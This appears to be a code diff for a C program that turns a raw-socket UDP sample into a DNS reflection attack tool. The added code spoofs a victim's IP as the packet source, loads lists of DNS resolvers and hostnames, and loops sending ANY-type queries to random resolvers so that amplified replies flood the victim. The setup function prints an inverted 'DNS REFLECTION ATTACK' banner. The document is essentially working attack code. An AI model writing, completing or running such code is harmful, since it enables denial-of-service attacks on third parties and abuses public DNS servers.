@@ -1,21 +1,44 @@
-#include<stdio.h>	//for printf
-#include<string.h> //memset
-#include<sys/socket.h>	//for socket ofcourse
-#include<stdlib.h> //for exit(0);
-#include<errno.h> //For errno - the error number
-#include<netinet/udp.h>	//Provides declarations for udp header
-#include<netinet/ip.h>	//Provides declarations for ip header
+#include <stdio.h>	
+#include <string.h>
+#include <sys/socket.h>	
+#include <stdlib.h> 
+#include <errno.h> //For errno - the error number
+#include <netinet/udp.h>	//Provides declarations for udp header
+#include <netinet/ip.h>	//Provides declarations for ip header
 #include <arpa/inet.h>
+#include <time.h>
 #include "utilities.h"
-/* 
-	96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
-*/
-//dns payload generator
 
+void dns_reflection(char * victimIP, int victimPort, int query_type, int nPackets){
+	unsigned char dnsServers[20][20];
+	unsigned char hostNames[20][30];
+	int nDns, nHost;
+	//load dns servers
+	FILE * dnsIPs = fopen ("dns_ips.txt", "r");
+	int i = 0;
+	while(i < 20 && fgets(dnsServers[i++], 20, dnsIPs)){
+		if (dnsServers[i - 1][strlen(dnsServers[i - 1]) - 1] == '\n'){
+			//remove newline at the end
+			dnsServers[i - 1][strlen(dnsServers[i - 1]) - 1] = 0;
+		}	
+	}
+	nDns = i - 1;
+	fclose(dnsIPs);
+	printf("%d dns servers loaded.\n", nDns);
 
+	//load hostnames
+	FILE * hostNameFile = fopen ("dns_hosts.txt", "r");
+	i = 0;
+	while(i < 20 && fgets(hostNames[i++], 20, hostNameFile)){
+		if (hostNames[i - 1][strlen(hostNames[i - 1]) - 1] == '\n'){
+			//remove newline at the end
+			hostNames[i - 1][strlen(hostNames[i - 1]) - 1] = 0;
+		}	
+	}
+	nHost = i - 1;
+	fclose(hostNameFile);
+	printf("%d host names loaded.\n", nHost);
 
-
-void dns_reflection(){
     //Create a raw socket of type IPPROTO
 	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
 	
@@ -27,10 +50,11 @@ void dns_reflection(){
 	}
 	
 	//Datagram to represent the packet
-	char datagram[4096] , source_ip[32] , *data , *pseudogram;
+	unsigned char datagram[40000] , source_ip[32] , *data , *pseudogram;
+	
 	
 	//zero out the packet buffer
-	memset (datagram, 0, 4096);
+	memset (datagram, 0, 40000);
 	
 	//IP header
 	struct iphdr *iph = (struct iphdr *) datagram;
@@ -43,56 +67,74 @@ void dns_reflection(){
 	
 	//Data part
 	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
-	strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
 	
-	//some address resolution
-	strcpy(source_ip , "192.168.1.2");
+
+
+	
+	
+	strcpy(source_ip , victimIP);
 	
 	sin.sin_family = AF_INET;
-	sin.sin_port = htons(80);
+	sin.sin_port = htons(DNS_PORT);
 	sin.sin_addr.s_addr = inet_addr ("192.168.1.1");
 	
 	//Fill in the IP Header
 	iph->ihl = 5;
 	iph->version = 4;
 	iph->tos = 0;
-	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
+	
 	iph->id = htonl (54321);	//Id of this packet
 	iph->frag_off = 0;
 	iph->ttl = 255;
 	iph->protocol = IPPROTO_UDP;
 	iph->check = 0;		//Set to 0 before calculating checksum
 	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
-	iph->daddr = sin.sin_addr.s_addr;
 	
-	//Ip checksum
-	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 	
+
 	//UDP header
-	udph->source = htons (6666);
-	udph->dest = htons (8622);
-	udph->len = htons(8 + strlen(data));	//tcp header size
+	udph ->source = htons (victimPort);
+	udph->dest = htons (DNS_PORT);
+	
 	udph->check = 0;	//leave checksum 0 now, filled later by pseudo header
 	
 	//Now the UDP checksum using the pseudo header
 	psh.source_address = inet_addr( source_ip );
-	psh.dest_address = sin.sin_addr.s_addr;
 	psh.placeholder = 0;
 	psh.protocol = IPPROTO_UDP;
-	psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );
 	
-	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
-	pseudogram = malloc(psize);
-	
-	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
-	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
-	
-	udph->check = csum( (unsigned short*) pseudogram , psize);
-	
-	//loop if you want to flood :)
-	//while (1)
-	{
-		//Send the packet
+	//initialize random rumber generator
+	time_t t;
+	srand((unsigned) time(&t));
+
+	while (nPackets--){
+		//select hostname and dns server
+		int curDns = rand() % nDns;
+		int curHost = rand() % nHost;
+
+		//create dns payload
+		int payloadLength = dns_payload_gen(data, hostNames[curHost], query_type);
+
+		//update udp header
+		udph->len = htons(8 + payloadLength);	//udp size
+		psh.dest_address = iph->daddr;
+
+		//update ip header
+		iph->daddr = inet_addr(dnsServers[curDns]);
+		iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + payloadLength;
+		//Ip checksum
+		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+
+		//update udp checksum
+		psh.udp_length = htons(sizeof(struct udphdr) + payloadLength);
+		int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payloadLength;
+		pseudogram = malloc(psize);	
+		memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
+		memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + payloadLength);
+		udph->check = csum( (unsigned short*) pseudogram , psize);
+		free(pseudogram);
+
+		//send packet
 		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
 		{
 			perror("sendto failed");
@@ -103,9 +145,12 @@ void dns_reflection(){
 			printf ("Packet Send. Length : %d \n" , iph->tot_len);
 		}
 	}
+
+
 	
 }
 
 void dns_reflection_setup(){
-    dns_reflection();
+	printf("⋊Ɔ∀⊥⊥∀ NOI⊥ƆƎ˥ℲƎᴚ SNᗡ\n");
+    dns_reflection("192.168.2.3", 6666, ANY, 1);
 }
